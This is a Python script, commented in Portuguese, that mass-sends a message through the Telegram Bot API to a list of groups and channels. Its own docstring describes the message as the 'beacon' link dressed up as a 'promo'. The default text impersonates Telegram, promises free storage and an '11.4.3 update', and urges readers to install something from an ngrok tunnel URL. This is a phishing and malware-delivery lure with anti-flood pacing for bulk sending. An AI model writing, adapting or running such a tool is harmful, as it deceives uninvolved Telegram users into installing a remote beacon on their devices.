#!/usr/bin/env python3
"""tg-send.py — dispara o link do beacon como "promo" via Telegram Bot API.

Uso:
  TG_BOT_TOKEN=123:ABC python3 tg-send.py --chats "@meugrupo,-100123456789"
  TG_BOT_TOKEN=... python3 tg-send.py --chats "@canal" --text promo.txt
  python3 tg-send.py --dry-run --chats "@teste        # mostra sem enviar
"""
import argparse, json, os, sys, time, urllib.error, urllib.parse, urllib.request

DEFAULT_TEXT = (
    "📢 Telegram liberou pacote promocional de lancamento!\n"
    "Instale agora e ganhe 5 GB de armazenamento gratis por 3 meses + "
    "pacote de stickers exclusivos.\n"
    "👉 https://badge-pristine-chirping.ngrok-free.dev/t\n"
    "Valido so hoje - atualizacao 11.4.3."
)


def send(token, chat, text):
    url = "https://api.telegram.org/bot" + token + "/sendMessage"
    data = urllib.parse.urlencode(
        {"chat_id": chat, "text": text, "disable_web_page_preview": False}).encode()
    req = urllib.request.Request(url, data=data)
    try:
        d = json.load(urllib.request.urlopen(req, timeout=20))
        return bool(d.get("ok")), d
    except urllib.error.HTTPError as e:
        try:
            return False, json.loads(e.read().decode() or "{}")
        except Exception:
            return False, {"error": "HTTP " + str(e.code)}
    except Exception as e:
        return False, {"error": str(e)}


def main():
    ap = argparse.ArgumentParser(description="Disparo de promocao via Telegram Bot API")
    ap.add_argument("--chats", help="lista separada por virgula: @canal,-100xxxx,123456")
    ap.add_argument("--text", help="caminho de arquivo com o texto da promo")
    ap.add_argument("--text-inline", help="texto direto na linha de comando")
    ap.add_argument("--delay", type=float, default=2.0, help="segundos entre envios (anti-flood)")
    ap.add_argument("--dry-run", action="store_true", help="so mostra o que seria enviado")
    a = ap.parse_args()

    token = os.environ.get("TG_BOT_TOKEN", "")
    if not a.dry_run and not token:
        print("ERRO: defina TG_BOT_TOKEN (ou use --dry-run)", file=sys.stderr)
        return 2

    if a.text_inline:
        text = a.text_inline
    elif a.text:
        text = open(a.text, encoding="utf-8").read()
    else:
        text = DEFAULT_TEXT

    chats = [c.strip() for c in (a.chats or os.environ.get("TG_CHATS", "")).split(",") if c.strip()]
    if not chats:
        print("ERRO: informe --chats (ou env TG_CHATS) - ex.: '@grupo,-100123456789'", file=sys.stderr)
        return 2

    print("[TG] alvos: %d | texto: %d chars" % (len(chats), len(text)))
    ok = 0
    for c in chats:
        if a.dry_run:
            print("[dry] -> %s: %s..." % (c, text[:60]))
            ok += 1
            continue
        okk, resp = send(token, c, text)
        print("[TG] -> %s: %s %s" % (c, "OK" if okk else "FALHOU", str(resp)[:160]))
        if okk:
            ok += 1
        time.sleep(a.delay)
    print("[TG] enviadas: %d/%d" % (ok, len(chats)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
